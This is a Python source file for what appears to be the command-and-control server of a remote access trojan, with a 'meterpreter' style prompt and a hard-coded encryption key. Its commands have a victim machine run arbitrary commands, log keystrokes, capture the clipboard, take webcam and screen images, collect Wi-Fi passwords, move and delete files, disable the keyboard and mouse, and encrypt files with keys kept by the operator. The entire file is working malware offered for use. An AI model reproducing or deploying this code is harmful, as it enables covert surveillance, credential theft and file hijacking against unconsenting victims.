import random
import socket, os
import subprocess
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from datetime import datetime
import helper
from vidstream import StreamingServer
from cryptography.fernet import Fernet


cipher_suite = Fernet("udkCdg78s5vf_6J24ebqm3NdBDPdv-6DIF05OSE0gHQ=")


def create_folder(folder_name):
    path = os.getcwd()
    folder_path = os.path.join(path, folder_name)
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)

class Server:
    def __init__(self, host, port):
        self.keys_path = None
        self.files_path = None
        self.client_addr = None
        self.host = host
        self.port = port
        self.BUFFER_SIZE = 1024
        self.connection = False
    def build_connection(self):
        global client, s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(100)
        print("[*] Server started on > {}:{} < | at [{}]".format(self.host, self.port,
                                                                 datetime.now().strftime("%H:%M:%S")))
        print("[*] Waiting for the client...")
        client, addr = s.accept()
        # self.client_addr = client.recv(self.BUFFER_SIZE).decode()
        self.client_addr = addr[0]
        print(f"[*] Connection is established successfully with {self.client_addr}")
        print("[*] type 'help' to show help message")
        print()
        self.connection = True
        create_folder("files")
        create_folder("keys")
        self.files_path = os.path.join(os.getcwd(), "files")
        self.keys_path = os.path.join(os.getcwd(), "keys")

    def server(self):
        try:
            global server
            server = StreamingServer(self.host, 8080)
            server.start_server()
        except:
            print("Module not found...")

    def send_data(self, data, s):
        data_size = len(data)
        size_bytes = data_size.to_bytes(4, 'big')
        if data_size <= self.BUFFER_SIZE:
            s.send(size_bytes + data)
        else:
            s.send(size_bytes)
            remaining_size = data_size
            offset = 0
            while remaining_size > 0:
                chunk_size = min(remaining_size, self.BUFFER_SIZE)
                chunk = data[offset:offset + chunk_size]
                s.send(chunk)
                offset += chunk_size
                remaining_size -= chunk_size

    def recv_data(self, s):
        size_bytes = s.recv(4)
        data_size = int.from_bytes(size_bytes, 'big')

        received_data = bytearray()

        while len(received_data) < data_size:
            remaining_size = data_size - len(received_data)
            chunk_size = min(remaining_size, self.BUFFER_SIZE)
            chunk = s.recv(chunk_size)
            received_data.extend(chunk)

        return bytes(received_data)

    def stop_server(self):
        server.stop_server()

    def result(self):
        encrypted_message = cipher_suite.encrypt(command.encode())
        client.send(encrypted_message)
        result_output = self.recv_data(client)
        result = cipher_suite.decrypt(result_output).decode('utf-8')
        print(result)

    def check_con(self):
        print("[~] Checking....")
        client.send(command.encode())
        status = client.recv(self.BUFFER_SIZE).decode()
        if status == "UP":
            print("[*] client: Connected to internet !\n")
        else:
            print("[!] client: Not Connected to internet !\n")

    def generate_encryption_key(self, filename):
        key_file = self.create_key_file(filename)
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048)

        pem_private_key = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption())
        with open(key_file, 'wb') as f:
            f.write(pem_private_key)
            f.close()

        return pem_private_key

    def create_key_file(self, filename):
        counter = 1

        if os.path.exists(f'{os.getcwd()}\\logs.txt'):
            print("The file exists.")
        else:
            with open(f'{os.getcwd()}\\logs.txt', 'w') as file:
                pass
            print("The file does not exist.")

        if os.path.exists(self.keys_path) and os.path.isdir(self.keys_path):
            contents = os.listdir(self.keys_path)
            print("Contents of the folder:")
            for item in contents:
                print(item)
                if (str(counter) in item):
                    counter += 1
                print(counter)
            with open(f'{self.keys_path}\\key{str(counter)}', 'w') as f:
                pass
        with open(f'{os.getcwd()}\\logs.txt', 'a') as file:
            file.write(f'{filename}: key{str(counter)} \n')

        return f'{self.keys_path}\\key{str(counter)}'
    def webcam_snap(self):
        encrypted_message = cipher_suite.encrypt(command.encode())
        client.send(encrypted_message)
        file = self.recv_data(client)
        counter = 1
        while os.path.exists(os.path.join(self.files_path, f"{counter}.png")):
            counter += 1
        with open(f'{self.files_path}\\{counter}.png', 'wb') as f:
            f.write(file)
            f.close()
        print("File is downloaded")
        print(f"File is stored at {self.files_path}")

    def screenshot(self):
        encrypted_message = cipher_suite.encrypt(command.encode())
        client.send(encrypted_message)
        file = self.recv_data(client)
        counter = 1
        while os.path.exists(os.path.join(self.files_path, f"{counter}.png")):
            counter += 1
        with open(f'{self.files_path}\\{counter}.png', 'wb') as f:
            f.write(file)
            f.close()
        print("File is downloaded")
        print(f"File is stored at {self.files_path}")
    def browse(self):
        encrypted_message = cipher_suite.encrypt(command.encode())
        client.send(encrypted_message)
        quiery = str(input("Enter the quiery: "))
        client.send(quiery.encode())
        result_output = client.recv(self.BUFFER_SIZE).decode()
        print(result_output)
    def readfile(self):
        if not command[9:]:
            print("No file to read")
        else:
            encrypted_message = cipher_suite.encrypt(command.encode())
            client.send(encrypted_message)
            result_output = self.recv_data(client)
            print("===================================================")
            print(result_output)
            print("===================================================")
    def send_clipboard(self):
        encrypted_message = cipher_suite.encrypt(command.encode())
        client.send(encrypted_message)
        file = self.recv_data(client)
        with open(f'{self.files_path}/clipboard.txt', 'wb') as f:
            f.write(file)
            f.close()
        print("File is downloaded")
    def send_keylogger(self):
        encrypted_message = cipher_suite.encrypt(command.encode())
        client.send(encrypted_message)
        file = self.recv_data(client)
        with open(f'{self.files_path}/keylogs.txt', 'wb') as f:
            f.write(file)
            f.close()
        print("File is downloaded")
    def send_message(self):
        encrypted_message = cipher_suite.encrypt(command.encode())
        client.send(encrypted_message)
        text = str(input("Enter the text: "))
        title = str(input("Enter the title: "))
        message_data = f"{text}:{title}"
        encrypted_message = cipher_suite.encrypt(message_data.encode())
        client.send(encrypted_message)
        result_output = self.recv_data(client)
        result = cipher_suite.decrypt(result_output).decode('utf-8')
        print(result)
    def download(self):
        encrypted_message = cipher_suite.encrypt(command.encode())
        client.send(encrypted_message)
        file = self.recv_data(client)
        with open(f'{self.files_path}/{command.split(" ")[1]}', 'wb') as f:
            f.write(file)
            f.close()
        print("File is downloaded")
    def upload(self):
        try:
            encrypted_message = cipher_suite.encrypt(command.encode())
            client.send(encrypted_message)
            filepath = command.split(" ")[1]
            data = open(filepath, 'rb')
            filedata = data.read()
            self.send_data(filedata, client)
            print(f"File '{filepath}' has been sent")
        except FileNotFoundError:
            print("File not found. Please check the file path.")
        except Exception as e:
            print(f"An error occurred while uploading the file: {e}")
    def encrypt(self):
        try:
            encrypted_message = cipher_suite.encrypt(command.encode())
            client.send(encrypted_message)
            filename = str(input("Enter the filepath to outcoming file (with filename and extension): "))
            client.send(filename.encode())
            encryption_key = self.generate_encryption_key(filename)
            print(encryption_key)
            self.send_data(encryption_key, client)
            print("done")
        except Exception as e:
            print(f"An error occurred during the encryption process: {e}")
    def send_command(self, command):
        try:
            if command == 'help':
                return helper.banner()
                
            encrypted_message = cipher_suite.encrypt(command.encode())
            client.send(encrypted_message)

            if command.startswith("encrypt"):
                filename = str(input("Enter the filepath to the outgoing file (with filename and extension): "))
                client.send(filename.encode())
                encryption_key = self.generate_encryption_key(filename)
                self.send_data(encryption_key, client)
                return "Encryption key sent successfully."

            elif command == 'webcam_snap':
                self.webcam_snap()
                return "Webcam snap command executed."

            elif command.startswith("screenshot"):
                self.screenshot()
                return "Screenshot command executed."

            elif command.startswith("browse"):
                self.browse()
                return "Browse command executed."

            elif command.startswith("readfile"):
                self.readfile()
                return "Readfile command executed."

            elif command.startswith("send_clipboard"):
                self.send_clipboard()
                return "Send clipboard command executed."

            elif command.startswith("send_keylogger"):
                self.send_keylogger()
                return "Send keylogger command executed."

            elif command.startswith("send_message"):
                self.send_message()
                return "Send message command executed."

            elif command.startswith("download"):
                self.download()
                return "Download command executed."

            elif command.startswith("upload"):
                self.upload()
                return "Upload command executed."

            elif command.startswith("encrypt"):
                self.encrypt()
                return "Encrypt command executed."

            else:
                result_output = self.recv_data(client)
                result = cipher_suite.decrypt(result_output).decode('utf-8')
                return result

        except Exception as e:
            return f"An error occurred while sending/receiving the command: {e}"

    def execute(self):
        helper.author()
        try:
            while True:
                global command
                command = input('meterpreter >>  ')
                command = command.lower()
                if command[:4] == 'exec':
                    self.result()
                elif command == 'drivers':
                    self.result()
                elif command == 'reboot':
                    self.result()

                elif command == 'usbdrivers':
                    self.result()

                elif command == 'monitors':
                    self.result()
                elif command == 'geolocate':
                    self.result()
                    
                elif command == 'keylogger_start':
                    self.result()

                elif command == 'keylogger_send':
                    self.send_keylogger()
                elif command == 'keylogger_stop':
                    self.result()

                elif command == 'clipboard_start':
                    self.result()

                elif command == 'clipboard_send':
                    self.send_clipboard()
                elif command == 'clipboard_stop':
                    self.result()


                elif command[:7] == 'delfile':
                    if not command[8:]:
                        print("No file to delete")
                    else:
                        self.result()

                elif command[:10] == 'createfile':
                    if not command[11:]:
                        print("No file to create")
                    else:
                        self.result()

                elif command == 'tasklist':
                    self.result()

                elif command == 'ipconfig':
                    self.result()

                elif command == 'sendmessage':
                    self.send_message()
                elif command == 'profiles':
                    self.result()
                elif command == "collect_wifipass":
                    self.result()
                elif command == 'cpu_cores':
                    self.result()
                elif command[:2] == 'cd':
                    if not command[3:]:
                        print("No directory")
                    else:
                        self.result()
                elif command == 'cd ..':
                    self.result()
                elif command == 'dir' or command == 'ls':
                    self.result()
                elif command == 'portscan':
                    self.result()
                elif command == 'systeminfo':
                    self.result()
                elif command == 'localtime':
                    self.result()
                elif command[:8] == 'readfile':
                   self.readfile()

                elif command.startswith("disable") and command.endswith("--keyboard"):
                    self.result()

                elif command.startswith("disable") and command.endswith("--mouse"):
                    self.result()

                elif command.startswith("disable") and command.endswith("--all"):
                    self.result()

                elif command.startswith("enable") and command.endswith("--all"):
                    self.result()

                elif command.startswith("enable") and command.endswith("--keyboard"):
                    self.result()

                elif command.startswith("enable") and command.endswith("--mouse"):
                    self.result()

                elif command[:7] == 'browser':
                    self.browse()

                elif command[:5] == 'mkdir':
                    if not command[6:]:
                        print("No directory name")
                    else:
                        self.result()

                elif command[:5] == 'rmdir':
                    if not command[6:]:
                        print("No directory name")
                    else:
                        self.result()

                elif command == 'curpid':
                    self.result()

                elif command == 'sysinfo':
                    self.result()

                elif command == 'pwd':
                    self.result()

                elif command == 'screenshare':
                    encrypted_message = cipher_suite.encrypt(command.encode())
                    client.send(encrypted_message)
                    self.server()

                elif command == 'webcam':
                    encrypted_message = cipher_suite.encrypt(command.encode())
                    client.send(encrypted_message)
                    self.server()

                elif command == 'breakstream':
                    self.stop_server()
                elif command == "lock_pc":
                    self.result()

                elif command[:8] == 'download':
                    self.download()
                elif command[:6] == 'upload':
                    self.upload()
                elif command == 'encrypt':
                    self.encrypt()
                elif command == 'help':
                    try:
                        helper.banner()
                    except Exception as e:
                        print(f"An error occurred while displaying the help: {e}")

                elif command == 'help':
                    helper.banner()

                elif command == 'screenshot':
                    self.screenshot()

                elif command == 'webcam_snap':
                    self.webcam_snap()
                elif command == 'exit':
                    print("[!] Connection has been killed!")
                    s.close()
                    client.close()
                    exit()

        except (KeyboardInterrupt, EOFError):
            print(" ")
            self.execute()
        except socket.error:
            print(f'[!] Connection Lost to: {self.client_addr}')
            client.close()
            s.close()
            exit(1)
        except UnicodeEncodeError:
            print(command)
            print(" ")
            self.execute()
        except Exception as e:
            print(f'[!] An error occurred: {str(e)}')
            self.execute()


# server = Server('127.0.0.1', 4444)

# if __name__ == '__main__':
#     server.build_connection()
    
#     # Start Flask app in a separate process
#     flask_app_path = os.path.join(os.getcwd(), 'gui/flask_app.py')
#     subprocess.Popen(['python', flask_app_path])

#     server.execute()
